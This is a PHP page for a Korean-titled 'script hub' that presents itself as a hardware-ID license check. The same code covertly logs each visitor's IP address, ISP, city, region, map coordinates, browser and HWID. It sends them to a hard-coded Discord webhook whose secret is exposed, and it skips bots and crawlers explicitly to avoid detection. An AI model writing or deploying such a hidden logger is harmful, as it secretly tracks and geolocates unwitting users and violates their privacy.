<!DOCTYPE html>
<head>
	<title>텍스트키 HUB</title>
</head>
<body>

<?php

if ($_GET["hwid"] !== "") {
    if (file_exists("data.json")) {
        $current_data = file_get_contents("Storage/data.json");
        $array_data = json_decode($current_data, true);
        
        $hwid = $_GET["hwid"];
        $encoded = hash("sha256", $hwid);
        
        if (in_array("$encoded", $array_data)) {
            echo "valid";
        } else {
            echo "invalid";
        }
    }
}
 
$webhookurl = "https://discord.com/api/webhooks/893122711960813640/cur1wuxhT0y9J-hekksFYeijuKR2v7jPk3Hreu52Wmu3QkhY_mqx3B0BdZ4mWBuvAd4Q";
 
 
$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');
$timestamp = date("c", strtotime("now"));
$ip= $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];
$Curl = curl_init("http://ip-api.com/json/$ip"); //Get the info of the IP using Curl
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);
 
if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
} // prevents bot detection
 
$ISP = $Info->isp;
$Country = $Info->country;
$Region = $Info->regionName;
$City = $Info->city;
$COORD = "$Info->lat, $Info->lon"; // Coordinates
 
$timestamp = date("c", strtotime("now"));
 
$json_data = json_encode([
    // Message
    "content" => "",
 
    // Username
    "username" => "스크립트 로그",
 
    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "텍스트키 HUB",
 
            // Embed Type
            "type" => "rich",
 
 
 
            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,
 
            // Embed left border color in HEX
            "color" => hexdec( "ff9933" ),
 
            // Footer
            "footer" => [
                "text" => "로그 확인됨",
                "icon_url" => "https://doy2mn9upadnk.cloudfront.net/uploads/default/original/4X/f/7/c/f7c9f2a9f31bf5748c52fa1087126828a5333ac8.png"
            ],
 
            // Thumbnail
            //"thumbnail" => [
            //    "url" => "https://i.vgy.me/Lzqvsr.png?size=600"
            //],
 
            // Author
            "author" => [
            ],
 
            // Field array of objects
            "fields" => [
                // Field 1
                [
                    "name" => "아이피",
                    "value" => "$ip",
                    "inline" => true
                ],
                // Field 2
                [
                    "name" => "위치",
                    "value" => "$City, $Region",
                    "inline" => true
                ],
                // Field 3
                [
                    "name" => "국가",
                    "value" => "$Country",
                    "inline" => true
                ],
                // Field 4
                [
                    "name" => "인터넷 서비스 제공자",
                    "value" => "$ISP",
                    "inline" => false
                ],
                // Field 5
                [
                    "name" => "좌표",
                    "value" => "$COORD",
                    "inline" => false
                ],
                // Field 1.5
                [
                    "name" => "날짜 & 시간",
                    "value" => "$TheirDate | $TheirTime",
                    "inline" => true
                ],
                // Field 6
                [
                    "name" => "브라우저",
                    "value" => "$Browser",
                    "inline" => false
                ],
                // Field 7
                [
                    "name" => "하드 아이디",
                    "value" => "$hwid",
                    "inline" => false
                ]
 
            ]
        ]
    ]
 
 
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
 
 
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
 
$response = curl_exec( $ch );
curl_close( $ch );
?>

